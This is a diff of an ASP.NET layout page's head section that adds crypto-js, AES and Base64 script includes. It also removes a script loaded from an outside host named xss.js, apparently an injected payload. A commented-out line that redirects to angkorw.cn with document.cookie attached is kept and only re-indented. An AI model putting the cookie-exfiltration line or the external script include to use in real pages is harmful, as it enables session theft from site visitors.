@@ -7,10 +7,13 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>@Request.Url</title>
     <link href="/Styles/style.css?v=@DateTime.Now.Ticks" type="text/css" rel="stylesheet" />
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/rxjs/6.5.1/rxjs.umd.js" type="text/javascript"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/rxjs/6.5.1/rxjs.umd.js"></script>
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.js"></script>
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/signalr.js/2.4.0/jquery.signalR.js"></script>
     <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/underscore.js/1.9.1/underscore.js"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/crypto-js.js"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.9-1/aes.js"></script>
+    <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/Base64/1.0.2/base64.js"></script>
     <script src="../../Scripts/jquery.color-2.1.2.js?v=@DateTime.Now.Ticks"></script>
     <script type="text/javascript" src="/Scripts/jQuery.tmpl.js?v=@DateTime.Now.Ticks"></script>
     <script type="text/javascript" src="/Scripts/hubs.js?v=@DateTime.Now.Ticks"></script>
@@ -18,7 +21,7 @@
     <script type="text/javascript" src="/Home/Tmpl?v=@DateTime.Now.Ticks"></script>
     <script src="/Scripts/render-tpl.js?v=@DateTime.Now.Ticks"></script>
     <script src="/Scripts/push_worker.js"></script>
-    <script src="https://a.angkorw.cn/Scripts/xss.js?t=@DateTime.Now.Ticks"></script>
+
     <script src="/Scripts/App.js"></script>
     <script type="text/javascript">
         document.domain = document.domain;
@@ -29,7 +32,7 @@
         }
     </script>
     <script type="text/javascript">
-        //window.location = "https://angkorw.cn/home/main?x" + document.cookie;
+                                //window.location = "https://angkorw.cn/home/main?x" + document.cookie;
     </script>
 </head>
 <body>
